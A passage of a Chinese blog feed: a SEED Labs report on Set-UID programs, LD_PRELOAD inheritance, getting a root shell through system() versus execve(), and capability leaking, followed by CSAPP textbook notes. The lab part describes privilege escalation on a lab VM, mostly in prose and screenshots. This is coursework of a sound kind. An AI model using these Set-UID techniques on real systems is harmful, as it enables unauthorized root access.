alt="image-20211021220918021"></p><ul><li>子进程与父进程环境变量相同，且含LD_PRELOAD，即子进程继承了用户进程的LD_PRELOAD环境变量。</li></ul><p>②程序为所有者为root的Set-UID 程序。以seed用户更改环境变量，执行程序。</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021221304514.png" alt="image-20211021221304514"></p><ul><li>父进程的环境变量可以发现LD_PRELOAD环境变量，而在子进程的环境变量中找不到，即子进程没有继承用户进程的LD_PRELOAD环境变量。</li></ul><p>③程序为所有者为root的Set-UID 程序。以root用户更改环境变量，分别以root用户和seed用户执行程序。</p><ul><li><p>以root用户运行：</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021221853609.png" alt="image-20211021221853609"></p><ul><li>子进程与父进程环境变量相同，且含LD_PRELOAD，即子进程继承了用户进程的LD_PRELOAD环境变量。</li></ul></li><li><p>以seed用户运行：</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021222645489.png" alt="image-20211021222645489"></p><ul><li>父进程的环境变量可以发现LD_PRELOAD环境变量，而在子进程的环境变量中找不到，即子进程没有继承用户进程的LD_PRELOAD环境变量。</li></ul></li></ul><p>④程序为所有者为user1的Set-UID程序。以seed用户执行程序。</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021222930510.png" alt="image-20211021222930510"></p><ul><li>父进程的环境变量可以发现LD_PRELOAD环境变量，而在子进程的环境变量中找不到，即子进程没有继承用户进程的LD_PRELOAD环境变量。</li></ul></li><li><p>主要原因：动态链接器的<strong>保护机制</strong>。</p><p>当运行进程的真实用户ID与程序的拥有者的用户ID不一致时，进程会忽略掉父进程的LD_PRELOAD环境变量；若ID一致，则子进程会继承此时运行进程的真实用户下的LD_PRELOAD环境变量，并加入共享库。</p></li></ul></li></ul><h2 id="Task-8-Invoking-External-Programs-Using-system-versus-execve"><a href="#Task-8-Invoking-External-Programs-Using-system-versus-execve" class="headerlink" title="Task 8: Invoking External Programs Using system() versus execve()"></a>Task 8: Invoking External Programs Using system() versus execve()</h2><p>新建一个目录t8，在该目录下创建test.txt文件。</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021225248348.png" alt="image-20211021225248348"></p><p>对于普通用户，test.txt是不可写的，尝试删除它，但权限不够</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021225330635.png" alt="image-20211021225330635"></p><ul><li><strong>Step1：</strong>编译上述程序，使其成为一个root拥有的Set-UID程序。 该程序将使用 system() 来调用该命令。</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021223845839.png" alt="image-20211021223845839"></p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021225640642.png" alt="image-20211021225640642"></p><p>通过catall得到了root权限的shell，成功删除test.txt。</p><ul><li><strong>Step2：</strong>注释掉system(command)语句，取消execve()语句； 程序将使用 execve() 来调用命令。</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021230139268.png" alt="image-20211021230139268"></p><p>攻击失败。因为execve会执行一个新程序，而不会调用新的shell程序。</p><h2 id="Task-9-Capability-Leaking"><a href="#Task-9-Capability-Leaking" class="headerlink" title="Task 9: Capability Leaking"></a>Task 9: Capability Leaking</h2><ul><li>以root用户创建一个etc文件夹，文件夹内创建zzz文件，并设置其权限为0644。</li></ul><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021230708725.png" alt="image-20211021230708725"></p><ul><li><p>更改cap_leak.c下zzz的路径</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021232010820.png" alt="image-20211021232010820"></p></li><li><p>编译cap_leak.c，设置为Set-UID root程序。</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021231031083.png" alt="image-20211021231031083"></p></li><li><p>在seed用户下运行，写入zzz：</p><p><img src="/2021/10/25/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8Lab1/image-20211021233542812.png" alt="image-20211021233542812"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>软件安全实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件安全实验</tag>
      
      <tag>计算机安全导论</tag>
      
      <tag>SeedUbuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>欢迎来到我的个人博客！</title>
    <link href="/2021/07/01/hello-world/"/>
    <url>/2021/07/01/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to my blog！</p><p>About me：<a href="https://yuhan2001.github.io/about/">关于页</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>《深入理解计算机系统》第3版课本笔记（1—6章）</title>
    <link href="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    <url>/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="深入理解计算机系统"><a href="#深入理解计算机系统" class="headerlink" title="深入理解计算机系统"></a>深入理解计算机系统</h1><h2 id="第1章-计算机系统漫游"><a href="#第1章-计算机系统漫游" class="headerlink" title="第1章 计算机系统漫游"></a>第1章 计算机系统漫游</h2><h3 id="1-1-信息就是位-上下文"><a href="#1-1-信息就是位-上下文" class="headerlink" title="1.1 信息就是位+上下文"></a>1.1 信息就是位+上下文</h3><h5 id="字节"><a href="#字节" class="headerlink" title="字节"></a>字节</h5><ul><li>源程序实际上就是一个由值0和1组成的位（又称为比特）序列，8个位被组织成一组，称为<code>字节</code>。    </li><li>大部分的现代计算机系统都使用ASCII标准来表示文本字符，这种方式实际上就是用一个唯一的单字节大小的整数值来表示每个字符。</li></ul><h5 id="文本文件和二进制文件"><a href="#文本文件和二进制文件" class="headerlink" title="文本文件和二进制文件"></a>文本文件和二进制文件</h5><ul><li>像hello.c这样只由ASCII字符构成的文件称为<code>文本文件</code>，所有其他文件都称为<code>二进制文件</code>。</li></ul><h3 id="1-2-程序被其他程序翻译成不同的格式"><a href="#1-2-程序被其他程序翻译成不同的格式" class="headerlink" title="1.2 程序被其他程序翻译成不同的格式"></a>1.2 程序被其他程序翻译成不同的格式</h3><ul><li>为了在系统上运行hello.c程序，每条C语句都必须被其他程序转化为一系列低级<code>机器语言</code>指令。然后这些指令按照一种称为<code>可执行目标程序</code>的格式打好包，并以二进制磁盘文件的形式存放起来。目标程序也被称为<code>可执行目标文件</code>。</li></ul><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><ul><li><p>执行这四个阶段的程序（<strong>预处理器</strong>、<strong>编译器</strong>、<strong>汇编器</strong>、<strong>链接器</strong>）一起构成了<strong>编译系统</strong>（compilation system）。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210606185900541.png" alt="image-20210606185900541"></p><ul><li><code>预处理</code>阶段。预处理器（cpp）根据以字符#开头的命令，修改原始的C程序。(<code>gcc -E test.c -o test.i</code>)</li><li><code>编译</code>阶段。编译器（ccl）将文本文件hello.i翻译成文本文件hello.s，它包含一个<code>汇编语言</code>程序。(<code>gcc -S test.i -o test.s</code>)</li><li><code>汇编</code>阶段。接下来，汇编器（as）将hello.s翻译成机器语言指令，把这些指令打包成一种叫做<code>可重定位目标程序</code>（relocatable object program）的格式，并将结果保存在目标文件hello.o中。(<code>gcc -c test.s -o test.o</code>)</li><li><code>链接</code>阶段。printf函数存在于一个名为printf.o的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的hello.o的程序中。链接器（ld）就负责处理这种合并。(<code>gcc test.o -o test</code>)</li></ul></li></ul><h3 id="1-3-了解编译系统如何工作是大有益处的"><a href="#1-3-了解编译系统如何工作是大有益处的" class="headerlink" title="1.3 了解编译系统如何工作是大有益处的"></a>1.3 了解编译系统如何工作是大有益处的</h3><h3 id="1-4-处理器读并解释储存在内存中的指令"><a href="#1-4-处理器读并解释储存在内存中的指令" class="headerlink" title="1.4 处理器读并解释储存在内存中的指令"></a>1.4 处理器读并解释储存在内存中的指令</h3><h5 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h5><ul><li>shell是一个命令解释器，它输出一个提示符，等待输入一个命令行，然后执行这个命令。如果该命令的第一个单词不是内置的shell命令，那么shell就会假设这是一个可执行文件的名字，它将加载并运行这个文件。</li></ul><h4 id="1-4-1-系统的硬件组成"><a href="#1-4-1-系统的硬件组成" class="headerlink" title="1.4.1 系统的硬件组成"></a>1.4.1 系统的硬件组成</h4><h5 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h5><ul><li>通常总线被设计成传输定长的字节块，也就是<code>字</code>（word）。字中的字节数（即<code>字长</code>）是一个基本的系统参数，各个系统中都不尽相同。</li></ul><h5 id="I-O设备"><a href="#I-O设备" class="headerlink" title="I/O设备"></a>I/O设备</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210606220545835.png" alt="image-20210606220545835" style="zoom:67%;"></p><h5 id="主存"><a href="#主存" class="headerlink" title="主存"></a>主存</h5><ul><li><strong>主存</strong>是一个临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据。</li></ul><h5 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h5><ul><li><p><strong>中央处理单元(CPU)</strong>，简称<strong>处理器</strong>，是解释（或执行）存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备（或寄存器），称为<strong>程序计数器</strong>。在任何时刻，PC都指向主存中的某条机器语言指令（即含有该条指令的地址）。</p></li><li><p>寄存器文件是一个小的存储设备，由一些单个字长的寄存器组成，每个寄存器都有唯一的名字。ALU计算新的数据和地址值。</p></li><li><p>CPU在指令的要求下可能会执行这些操作：</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210606221113545.png" alt="image-20210606221113545" style="zoom:67%;"></p></li></ul><h4 id="1-4-2-运行hello程序"><a href="#1-4-2-运行hello程序" class="headerlink" title="1.4.2 运行hello程序"></a>1.4.2 运行hello程序</h4><h3 id="1-5-高速缓存至关重要"><a href="#1-5-高速缓存至关重要" class="headerlink" title="1.5 高速缓存至关重要"></a>1.5 高速缓存至关重要</h3><h3 id="1-6-存储设备形成层次结构"><a href="#1-6-存储设备形成层次结构" class="headerlink" title="1.6 存储设备形成层次结构"></a>1.6 存储设备形成层次结构</h3><h5 id="一个存储器层次结构的示例"><a href="#一个存储器层次结构的示例" class="headerlink" title="一个存储器层次结构的示例"></a>一个存储器层次结构的示例</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210606221257531.png" alt="image-20210606221257531"></p><ul><li>存储器层次结构的主要思想是上一层的存储器作为低一层存储器的高速缓存。</li></ul><h3 id="1-7-操作系统管理硬件"><a href="#1-7-操作系统管理硬件" class="headerlink" title="1.7 操作系统管理硬件"></a>1.7 操作系统管理硬件</h3><h5 id="计算机系统的分层视图"><a href="#计算机系统的分层视图" class="headerlink" title="计算机系统的分层视图"></a>计算机系统的分层视图</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210606221506397.png" alt="image-20210606221506397" style="zoom:67%;"></p><ul><li>我们可以把操作系统看作是应用程序与硬件之前插入的一层软件。</li></ul><h5 id="操作系统提供的抽象表示"><a href="#操作系统提供的抽象表示" class="headerlink" title="操作系统提供的抽象表示"></a>操作系统提供的抽象表示</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210606221615091.png" alt="image-20210606221615091"></p><ul><li>操作系统由两个基本功能：（1）防止硬件被失控的应用程序滥用；（2）向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。</li><li>文件是对I/O设备的抽象表示，虚拟内存是对主存和硬盘I/O设备的抽象表示，进程则是对处理器、主存和I/O设备的抽象表示。</li></ul><h4 id="1-7-1-进程"><a href="#1-7-1-进程" class="headerlink" title="1.7.1 进程"></a>1.7.1 进程</h4><ul><li><code>进程</code>是操作系统对一个正在运行的程序的一种抽象。</li></ul><h5 id="进程的上下文切换"><a href="#进程的上下文切换" class="headerlink" title="进程的上下文切换"></a>进程的上下文切换</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210606222029334.png" alt="image-20210606222029334" style="zoom:67%;"></p><h4 id="1-7-2-线程"><a href="#1-7-2-线程" class="headerlink" title="1.7.2 线程"></a>1.7.2 线程</h4><ul><li>一个进程实际上可以又多个称为<code>线程</code>的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和全局数据。</li></ul><h4 id="1-7-3-虚拟内存"><a href="#1-7-3-虚拟内存" class="headerlink" title="1.7.3 虚拟内存"></a>1.7.3 虚拟内存</h4><h5 id="虚拟地址空间"><a href="#虚拟地址空间" class="headerlink" title="虚拟地址空间"></a>虚拟地址空间</h5><ul><li><p>每个进程看到的内存都是一致的，称为<code>虚拟地址空间</code>。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210606222335649.png" alt="image-20210606222335649" style="zoom:67%;"></p></li></ul><h4 id="1-7-4-文件"><a href="#1-7-4-文件" class="headerlink" title="1.7.4 文件"></a>1.7.4 文件</h4><ul><li><strong>文件</strong>就是字符序列。</li></ul><h3 id="1-8-系统之间利用网络通信"><a href="#1-8-系统之间利用网络通信" class="headerlink" title="1.8 系统之间利用网络通信"></a>1.8 系统之间利用网络通信</h3><h3 id="1-9-重要主题"><a href="#1-9-重要主题" class="headerlink" title="1.9 重要主题"></a>1.9 重要主题</h3><h4 id="1-9-1-Amdahl定律"><a href="#1-9-1-Amdahl定律" class="headerlink" title="1.9.1 Amdahl定律"></a>1.9.1 Amdahl定律</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210606222829047.png" alt="image-20210606222829047"></p><h4 id="1-9-2-并发和并行"><a href="#1-9-2-并发和并行" class="headerlink" title="1.9.2 并发和并行"></a>1.9.2 并发和并行</h4><ul><li><strong>并发</strong>（concurrency）是一个通用的概念，指一个同时具有多个活动的系统；而术语<strong>并行</strong>（parallelism）指的是用并发来使一个系统运行得更快。</li></ul><h4 id="1-9-3-计算机系统中抽象的重要性"><a href="#1-9-3-计算机系统中抽象的重要性" class="headerlink" title="1.9.3 计算机系统中抽象的重要性"></a>1.9.3 计算机系统中抽象的重要性</h4><p><strong>文件</strong>是多I/O设备的抽象，<strong>虚拟内存</strong>是对程序存储器的抽象，<strong>进程</strong>是对一个正在运行的程序的抽象，<strong>虚拟机</strong>是整个计算机的抽象，包括存储系统，处理器和程序。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210606223232436.png" alt="image-20210606223232436"></p><h2 id="第2章-信息的表示和处理"><a href="#第2章-信息的表示和处理" class="headerlink" title="第2章 信息的表示和处理"></a>第2章 信息的表示和处理</h2><ul><li>整数的表示虽然只能编码一个相对较小的数值范围，但是这种表示是精确的；而浮点数虽然可以编码一个较大的数值范围，但是这种表示只是近似的。</li></ul><h3 id="2-1-信息存储"><a href="#2-1-信息存储" class="headerlink" title="2.1 信息存储"></a>2.1 信息存储</h3><ul><li>大多数计算机使用8位的块，或者<strong>字节</strong>（byte），作为最小的可寻址的内存单位。</li></ul><h4 id="2-1-1-十六进制表示法"><a href="#2-1-1-十六进制表示法" class="headerlink" title="2.1.1 十六进制表示法"></a>2.1.1 十六进制表示法</h4><h4 id="2-1-2-字数据大小"><a href="#2-1-2-字数据大小" class="headerlink" title="2.1.2 字数据大小"></a>2.1.2 字数据大小</h4><h5 id="字长"><a href="#字长" class="headerlink" title="字长"></a>字长</h5><ul><li>每台计算机都有一个<strong>字长</strong>（word size），指明指针数据的标称大小（nominal size）。</li><li>对于一个字长为$w$位的机器而言，虚拟地址的范围为$0$~$2^w-1$，程序最多访问$2^w$个字节。</li></ul><h5 id="向后兼容"><a href="#向后兼容" class="headerlink" title="向后兼容"></a>向后兼容</h5><ul><li>当程序prog.c用如下伪指令编译后<code>linux&gt; gcc -m32 prog.c</code>，该程序就可以在32位或64位机器上正确运行。</li><li>另一方面，若程序用下述伪指令编译<code>linux&gt; gcc -m64 prog.c</code>，那就只能在64位机器上运行。</li></ul><h4 id="2-1-3-寻址和字节顺序"><a href="#2-1-3-寻址和字节顺序" class="headerlink" title="2.1.3 寻址和字节顺序"></a>2.1.3 寻址和字节顺序</h4><ul><li>在几乎所有的机器上，多字节对象都被存储为连续的字节序列，对象的地址为所用字节中最小的地址。</li></ul><h5 id="小端法和大端法"><a href="#小端法和大端法" class="headerlink" title="小端法和大端法"></a>小端法和大端法</h5><ul><li><p>最低有效字节在最前面的方式，称为<strong>小端法</strong>（little endian）。</p></li><li><p>最高有效字节在最前面的方式，称为<strong>大端法</strong>（big endian）。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210607230607757.png" alt="image-20210607230607757" style="zoom:67%;"></p></li><li><p>一旦选择了特定操作系统，那么字节顺序也就固定下来。</p></li></ul><h4 id="2-1-4-表示字符串"><a href="#2-1-4-表示字符串" class="headerlink" title="2.1.4 表示字符串"></a>2.1.4 表示字符串</h4><ul><li>C语言中字符串被编码为一个以null（其值为0）字符结尾的字符数组。</li></ul><h4 id="2-1-5-表示代码"><a href="#2-1-5-表示代码" class="headerlink" title="2.1.5 表示代码"></a>2.1.5 表示代码</h4><h4 id="2-1-6-布尔代数简介"><a href="#2-1-6-布尔代数简介" class="headerlink" title="2.1.6 布尔代数简介"></a>2.1.6 布尔代数简介</h4><h4 id="2-1-7-C语言中的位级运算"><a href="#2-1-7-C语言中的位级运算" class="headerlink" title="2.1.7 C语言中的位级运算"></a>2.1.7 C语言中的位级运算</h4><ul><li>位级运算的一个常见用法就是实现<strong>掩码</strong>运算<ul><li>例子：位级运算<code>x&amp;0xFF</code>生成一个由x的最低有效字节组成的值。</li></ul></li></ul><h4 id="2-1-8-C语言中的逻辑运算"><a href="#2-1-8-C语言中的逻辑运算" class="headerlink" title="2.1.8 C语言中的逻辑运算"></a>2.1.8 C语言中的逻辑运算</h4><ul><li>逻辑运算符&amp;&amp;和||与它们对应的位级运算&amp;和|之间第二个重要的区别是，如果对第一个参数求值就能确定表达式的结果，那么逻辑运算符就不会对第二个参数求值就能确定表达式的结果，那么逻辑运算符就不会对第二个参数求值。因此，例如，表达式<code>a&amp;&amp;5/a</code>将不会造成被零除，而表达式<code>p&amp;&amp;*p++</code>也不会导致间接引用空指针。</li></ul><h4 id="2-1-9-C语言中的移位运算"><a href="#2-1-9-C语言中的移位运算" class="headerlink" title="2.1.9 C语言中的移位运算"></a>2.1.9 C语言中的移位运算</h4><ul><li>移位运算是从左至右可结合的。</li><li>机器支持两种形式的右移：<strong>逻辑右移</strong>和<strong>算术右移</strong>。逻辑右移在左端补k个0，算术右移在左端补k个最高有效位的值。</li><li>实际上，几乎所有的编译器/机器组合都对有符号数使用算术右移。</li><li>另一方面，对于无符号数，右移必须是逻辑的。</li></ul><h5 id="若-k-大于-w-位"><a href="#若-k-大于-w-位" class="headerlink" title="若$k$大于$w$位"></a>若$k$大于$w$位</h5><p>位移量通过计算$k$mod$w$得到。</p><ul><li>加法和减法的优先级比移位运算要高。</li></ul><h3 id="2-2-整数表示"><a href="#2-2-整数表示" class="headerlink" title="2.2 整数表示"></a>2.2 整数表示</h3><p>B：二进制；</p><p>T：补码；</p><p>U：无符号。</p><h5 id="整数的数据与算术操作术语，下标-w-表示数据表示中的位数"><a href="#整数的数据与算术操作术语，下标-w-表示数据表示中的位数" class="headerlink" title="整数的数据与算术操作术语，下标$w$表示数据表示中的位数"></a>整数的数据与算术操作术语，下标$w$表示数据表示中的位数</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210607235940694.png" alt="image-20210607235940694" style="zoom:67%;"></p><h4 id="2-2-1-整型数据类型"><a href="#2-2-1-整型数据类型" class="headerlink" title="2.2.1 整型数据类型"></a>2.2.1 整型数据类型</h4><h5 id="C语言整型数据类型的典型取值范围"><a href="#C语言整型数据类型的典型取值范围" class="headerlink" title="C语言整型数据类型的典型取值范围"></a>C语言整型数据类型的典型取值范围</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608000105612.png" alt="image-20210608000105612" style="zoom:67%;"></p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608181810596.png" alt="image-20210608181810596" style="zoom:67%;"></p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608181837956.png" alt="image-20210608181837956" style="zoom:67%;"></p><h4 id="2-2-无符号数的编码"><a href="#2-2-无符号数的编码" class="headerlink" title="2.2 无符号数的编码"></a>2.2 无符号数的编码</h4><h5 id="无符号数编码的定义"><a href="#无符号数编码的定义" class="headerlink" title="无符号数编码的定义"></a>无符号数编码的定义</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608181943455.png" alt="image-20210608181943455" style="zoom:67%;"></p><ul><li>函数$B2U_w$能够被定义为一个映射：$B2U_w：\lbrace0,1\rbrace^w \to \lbrace 0,…,2^w-1 \rbrace$。</li></ul><h5 id="无符号数编码的唯一性"><a href="#无符号数编码的唯一性" class="headerlink" title="无符号数编码的唯一性"></a>无符号数编码的唯一性</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608182836509.png" alt="image-20210608182836509" style="zoom:67%;"></p><h4 id="2-2-3-补码编码"><a href="#2-2-3-补码编码" class="headerlink" title="2.2.3 补码编码"></a>2.2.3 补码编码</h4><h5 id="补码编码的定义"><a href="#补码编码的定义" class="headerlink" title="补码编码的定义"></a>补码编码的定义</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608183201953.png" alt="image-20210608183201953" style="zoom:67%;"></p><h5 id="补码编码的唯一性"><a href="#补码编码的唯一性" class="headerlink" title="补码编码的唯一性"></a>补码编码的唯一性</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608183234799.png" alt="image-20210608183234799" style="zoom:67%;"></p><ul><li><p>补码的范围是不对称的：$|TMin|=|TMax|+1$。</p></li><li><p>最大的无符号数值刚好比补码的最大值的两倍的大一点：$UMax_w=2TMax_w+1$。</p><p>注意$-1$和$UMax$由同样的位表示——一个全1的串。</p></li></ul><h4 id="2-2-4-有符号数与无符号数之间的转换"><a href="#2-2-4-有符号数与无符号数之间的转换" class="headerlink" title="2.2.4 有符号数与无符号数之间的转换"></a>2.2.4 有符号数与无符号数之间的转换</h4><ul><li>假设变量x声明位int，u声明为unsigned，表达式(unsigned)x会将x的值转换成一个无符号数值，而(int)u将u的值转换成一个有符号整数。</li></ul><h5 id="补码转换为无符号数："><a href="#补码转换为无符号数：" class="headerlink" title="补码转换为无符号数："></a>补码转换为无符号数：</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608184712172.png" alt="image-20210608184712172" style="zoom:67%;"></p><h5 id="无符号数转化为补码"><a href="#无符号数转化为补码" class="headerlink" title="无符号数转化为补码"></a>无符号数转化为补码</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608184746355.png" alt="image-20210608184746355" style="zoom:67%;"></p><h4 id="2-2-5-C语言中的有符号数与无符号数"><a href="#2-2-5-C语言中的有符号数与无符号数" class="headerlink" title="2.2.5 C语言中的有符号数与无符号数"></a>2.2.5 C语言中的有符号数与无符号数</h4><ul><li>如果它的一个运算数是有符号而另一个是无符号的，那么C语言会隐式地将有符号参数强制类型转换为无符号数。</li></ul><h4 id="2-2-6-扩展一个数字的位表示"><a href="#2-2-6-扩展一个数字的位表示" class="headerlink" title="2.2.6 扩展一个数字的位表示"></a>2.2.6 扩展一个数字的位表示</h4><h5 id="零扩展"><a href="#零扩展" class="headerlink" title="零扩展"></a>零扩展</h5><ul><li><p>要将一个无符号数转换为一个更大的数据类型，我们只要简单的在表示的开头添加0。这种运算被称为<strong>零扩展</strong>（zero extension）</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608185221135.png" alt="image-20210608185221135" style="zoom:67%;"></p></li></ul><h5 id="符号扩展"><a href="#符号扩展" class="headerlink" title="符号扩展"></a>符号扩展</h5><ul><li><p>要将一个补码数字转换为一个更大的数据类型，可以执行一个<strong>符号扩展</strong>（sign extension）</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608185326409.png" alt="image-20210608185326409" style="zoom:67%;"></p></li></ul><h4 id="2-2-7-截断数字"><a href="#2-2-7-截断数字" class="headerlink" title="2.2.7 截断数字"></a>2.2.7 截断数字</h4><h5 id="截断无符号数"><a href="#截断无符号数" class="headerlink" title="截断无符号数"></a>截断无符号数</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608185436962.png" alt="image-20210608185436962" style="zoom:67%;"></p><h5 id="截断补码数值"><a href="#截断补码数值" class="headerlink" title="截断补码数值"></a>截断补码数值</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608185503997.png" alt="image-20210608185503997" style="zoom:67%;"></p><h4 id="2-2-8-关于有符号数与无符号数的建议"><a href="#2-2-8-关于有符号数与无符号数的建议" class="headerlink" title="2.2.8 关于有符号数与无符号数的建议"></a>2.2.8 关于有符号数与无符号数的建议</h4><h3 id="2-3-整数运算"><a href="#2-3-整数运算" class="headerlink" title="2.3 整数运算"></a>2.3 整数运算</h3><h4 id="2-3-1-无符号加法"><a href="#2-3-1-无符号加法" class="headerlink" title="2.3.1 无符号加法"></a>2.3.1 无符号加法</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608185633585.png" alt="image-20210608185633585" style="zoom:67%;"></p><h5 id="检测无符号数中加法的溢出"><a href="#检测无符号数中加法的溢出" class="headerlink" title="检测无符号数中加法的溢出"></a>检测无符号数中加法的溢出</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210608185706207.png" alt="image-20210608185706207" style="zoom:67%;"></p><h5 id="无符号数求反"><a 